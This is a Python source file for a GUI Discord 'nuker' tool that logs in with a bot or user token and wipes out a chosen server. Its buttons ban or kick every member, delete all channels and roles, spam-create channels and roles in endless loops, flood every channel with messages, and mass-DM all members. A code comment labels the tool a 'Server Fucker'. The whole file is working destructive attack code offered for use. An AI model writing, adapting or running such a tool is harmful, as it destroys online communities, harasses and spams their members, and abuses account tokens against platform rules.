from tkinter import *
import discord
import threading
import time
import asyncio
import random
import os

os.system("cls")
os.system("title Tyclonie Tech")

intents = discord.Intents.all()
client = discord.Client(intents=intents)
discord_start_bool = False
discord_already_triggered = False
login_frame = None
start_discord_button = None
token_entry = None
root = None
bot_user_var = None


def start_discord_client():
    global discord_start_bool
    discord_start_bool = True


class NukeOptions:

    @staticmethod
    def ban_all(server_id: str, blacklisted_users):
        global client
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_ban_all():
                    for member in guild.members:
                        if str(member.id) not in blacklisted_users.split() and member.id != client.user.id:
                            try:
                                await member.ban(reason="ooft")
                            except Exception as e:
                                print(f"Error With Banning {member}: {str(e)}")

                asyncio.run_coroutine_threadsafe(start_ban_all(), client.loop)

    @staticmethod
    def kick_all(server_id: str, blacklisted_users: str):
        global client
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_kick_all():
                    for member in guild.members:
                        if str(member.id) not in blacklisted_users.split() and member.id != client.user.id:
                            try:
                                await member.kick(reason="ooft")
                            except Exception as e:
                                print(f"Error With Kicking {member}: {str(e)}")

                asyncio.run_coroutine_threadsafe(start_kick_all(), client.loop)

    @staticmethod
    def delete_all_channels(server_id: str):
        global client
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_deleting_channels():
                    for channel in guild.channels:
                        try:
                            await channel.delete()
                        except Exception as e:
                            print(f"Error With Deleting Channel {channel}: {str(e)}")

                asyncio.run_coroutine_threadsafe(start_deleting_channels(), client.loop)

    @staticmethod
    def spam_make_channels(server_id: str, channel_name: str):
        global client
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_spamming_channels():
                    while True:
                        try:
                            await guild.create_text_channel(channel_name)
                        except Exception as e:
                            print(f"Error With Making Channels: {str(e)}")
                            if "Maximum number of server channels reached" in str(e):
                                break

                asyncio.run_coroutine_threadsafe(start_spamming_channels(), client.loop)

    @staticmethod
    def delete_all_roles(server_id: str):
        global client
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_deleting_roles():
                    for role in guild.roles:
                        try:
                            await role.delete()
                        except Exception as e:
                            print(f"Error Deleting Role {role}: {str(e)}")

                asyncio.run_coroutine_threadsafe(start_deleting_roles(), client.loop)

    @staticmethod
    def spam_make_roles(server_id: str, role_name: str):
        global client
        role_name = role_name.replace("-", " ")
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_spamming_roles():
                    while True:
                        try:
                            await guild.create_role(name=role_name,
                                                    colour=discord.Colour.from_rgb(random.randint(0, 255),
                                                                                   random.randint(0, 255),
                                                                                   random.randint(0, 255)))
                        except Exception as e:
                            print(f"Error With Making Roles: {str(e)}")
                            if "Maximum number of server roles reached" in str(e):
                                break

                asyncio.run_coroutine_threadsafe(start_spamming_roles(), client.loop)

    @staticmethod
    def spam_message(server_id: str, message: str):
        global client
        message = message.replace("+-", " ")
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_spamming_messages():
                    while True:
                        try:
                            for channel in guild.channels:
                                await channel.send(message)
                        except Exception as e:
                            print(f"Error With Sending Spam Message: {str(e)}")
                        await asyncio.sleep(0.1)

                asyncio.run_coroutine_threadsafe(start_spamming_messages(), client.loop)

    @staticmethod
    def message_all(server_id: str, message: str):
        global client
        message = message.replace("+-", " ")
        for guild in client.guilds:
            if str(guild.id) == server_id:
                async def start_messaging_all():
                    for member in guild.members:
                        try:
                            await member.send(message)
                        except Exception as e:
                            print(f"Error With Messaging {member}: {str(e)}")

                asyncio.run_coroutine_threadsafe(start_messaging_all(), client.loop)


class WindowAspects:

    @staticmethod
    def nuke_options():
        global start_discord_button, token_entry, login_frame, client, root
        root.geometry("275x450")
        token_entry.destroy()
        start_discord_button.destroy()
        login_frame.destroy()
        client_info_frame = LabelFrame(root, text="Client Information", bg="black", fg="red")
        client_info_frame.pack()
        client_user = Label(client_info_frame, text=f"User: {str(client.user)}", bg="black", fg="red")
        client_user.grid(row=0, column=0, padx=2, pady=2)
        client_guilds = Label(client_info_frame, text=f"User Guilds: {str(len(client.guilds))}", bg="black", fg="red")
        client_guilds.grid(row=1, column=0, padx=2, pady=2)
        nuke_setting_frame = LabelFrame(root, text="Nuke Settings", bg="black", fg="red")
        nuke_setting_frame.pack()
        guild_id = Entry(nuke_setting_frame, bg="black", fg="red")
        guild_id.grid(row=0, column=0, padx=2, pady=2)
        guild_id.insert(0, "Guild ID")
        member_nuke_options_frame = LabelFrame(root, text="Member Nuke Options", bg="black", fg="red")
        member_nuke_options_frame.pack()
        channel_options_frame = LabelFrame(root, text="Channel Nuke Options", bg="black", fg="red")
        channel_options_frame.pack()
        ban_all_button = Button(member_nuke_options_frame, text="Ban All Members",
                                command=lambda: NukeOptions.ban_all(guild_id.get(), ban_blacklisted_users.get()),
                                bg="black", fg="red", width=17)
        ban_all_button.grid(row=0, column=0, padx=2, pady=2)
        ban_blacklisted_users = Entry(member_nuke_options_frame, bg="black", fg="red", width=14)
        ban_blacklisted_users.grid(row=0, column=1, padx=2, pady=2)
        ban_blacklisted_users.insert(0, "Except User ID's")
        kick_all_button = Button(member_nuke_options_frame, text="Kick All Members",
                                 command=lambda: NukeOptions.kick_all(guild_id.get(), kick_blacklisted_users.get()),
                                 bg="black", fg="red", width=17)
        kick_all_button.grid(row=1, column=0, padx=2, pady=2)
        kick_blacklisted_users = Entry(member_nuke_options_frame, bg="black", fg="red", width=14)
        kick_blacklisted_users.grid(row=1, column=1, padx=2, pady=2)
        kick_blacklisted_users.insert(0, "Except User ID's")
        delete_all_channels_button = Button(channel_options_frame, text="Delete All Channels",
                                            command=lambda: NukeOptions.delete_all_channels(guild_id.get()),
                                            bg="black", fg="red", width=17)
        delete_all_channels_button.grid(row=0, column=0, padx=2, pady=2)
        delete_all_channel_no_options_label = Label(channel_options_frame, text="No Options", bg="black", fg="red")
        delete_all_channel_no_options_label.grid(row=0, column=1, padx=2, pady=2)
        spam_make_channels_button = Button(channel_options_frame, text="Spam Make Channels",
                                           command=lambda: NukeOptions.spam_make_channels(guild_id.get(),
                                                                                          spam_make_channels_name.get().replace(
                                                                                              " ", "-")),
                                           bg="black", fg="red", width=17)
        spam_make_channels_button.grid(row=1, column=0, padx=2, pady=2)
        spam_make_channels_name = Entry(channel_options_frame, bg="black", fg="red", width=14)
        spam_make_channels_name.grid(row=1, column=1, padx=2, pady=2)
        spam_make_channels_name.insert(0, "Channel Name")
        roles_nuke_options_frame = LabelFrame(root, text="Role Nuke Options", bg="black", fg="red")
        roles_nuke_options_frame.pack()
        delete_all_roles_button = Button(roles_nuke_options_frame, text="Delete All Roles",
                                         command=lambda: NukeOptions.delete_all_roles(guild_id.get()), bg="black", fg="red", width=17)
        delete_all_roles_button.grid(row=0, column=0, padx=2, pady=2)
        delete_all_roles_no_options_label = Label(roles_nuke_options_frame, text="No Options", bg="black", fg="red")
        delete_all_roles_no_options_label.grid(row=0, column=1, padx=2, pady=2)
        spam_make_roles_button = Button(roles_nuke_options_frame, text="Spam Make Roles",
                                        command=lambda: NukeOptions.spam_make_roles(guild_id.get(),
                                                                                    spam_role_name_entry.get().replace(" ", "-")),
                                        bg="black", fg="red", width=17)
        spam_make_roles_button.grid(row=1, column=0, padx=2, pady=2)
        spam_role_name_entry = Entry(roles_nuke_options_frame, bg="black", fg="red", width=14)
        spam_role_name_entry.grid(row=1, column=1, padx=2, pady=2)
        spam_role_name_entry.insert(0, "Role Name")
        text_nuke_options_frame = LabelFrame(root, text="Text Nuke Options", bg="black", fg="red")
        text_nuke_options_frame.pack()
        spam_messages_button = Button(text_nuke_options_frame, text="Spam Message", command=lambda: NukeOptions.spam_message(
            guild_id.get(), spam_messages_message_entry.get().replace(
                " ", "+-")), bg="black", fg="red", width=17)
        spam_messages_button.grid(row=0, column=0, padx=2, pady=2)
        spam_messages_message_entry = Entry(text_nuke_options_frame, bg="black", fg="red", width=14)
        spam_messages_message_entry.grid(row=0, column=1, padx=2, pady=2)
        spam_messages_message_entry.insert(0, "Message")
        message_all_button = Button(text_nuke_options_frame, text="DM All", command=lambda: NukeOptions.message_all(
            guild_id.get(), message_all_message_entry.get().replace(" ", "+-")), bg="black", fg="red", width=17)
        message_all_button.grid(row=1, column=0, padx=2, pady=2)
        message_all_message_entry = Entry(text_nuke_options_frame, bg="black", fg="red", width=14)
        message_all_message_entry.grid(row=1, column=1, padx=2, pady=2)
        message_all_message_entry.insert(0, "Message")

    @staticmethod
    def window():
        global token_entry, root, start_discord_button, login_frame, bot_user_var
        root = Tk()
        root["bg"] = "black"
        root.title("Tyclonie Tech")
        root.geometry("250x85")
        login_frame = LabelFrame(root, text="Login Information", bg="black", fg="red")
        login_frame.pack()
        token_entry = Entry(login_frame, bg="black", fg="red")
        token_entry.grid(row=0, column=0, padx=2, pady=2)
        token_entry.insert(0, "Enter Token")
        bot_user_var = BooleanVar()
        bot_user = Checkbutton(login_frame, text="User Token?", variable=bot_user_var, bg="black", fg="red")
        bot_user.grid(row=0, column=1, padx=2, pady=2)
        start_discord_button = Button(root, text="Start Client", command=start_discord_client, bg="black",
                                      fg="red")
        start_discord_button.pack(pady=2)
        root.mainloop()


def start_discord():
    global discord_start_bool, discord_already_triggered, client, bot_user_var, token_entry
    while True:
        if discord_start_bool and not discord_already_triggered:
            discord_already_triggered = True
            token = token_entry.get()
            bot_user = bot_user_var.get()

            @client.event
            async def on_ready():
                print(f"Logged into user: {client.user}")
                WindowAspects.nuke_options()

            if not bot_user:
                print("""Note: For bot accounts make sure that you have intents enabled! On the bot tab on your Discord
Developer Portal application, enable both intents.""")
                client.run(token)
            else:
                print("""Note: Some features may not work as intended on user accounts, due to the new discord API
- This is due to the new Intents System put in place and so features like Mass DM/Ban/Kick may not
  work as well.
- This stated, I recommend if you have Administrator Permissions, you add a discord bot
  to the server, you can create one at the Discord Developer Portal.""")
                client.run(token, bot=False)

        time.sleep(0.1)


# Server Fucker

def main():
    window_thread = threading.Thread(target=WindowAspects.window)
    discord_thread = threading.Thread(target=start_discord)
    window_thread.start()
    discord_thread.start()
    window_thread.join()
    discord_thread.join()


if __name__ == "__main__":
    main()
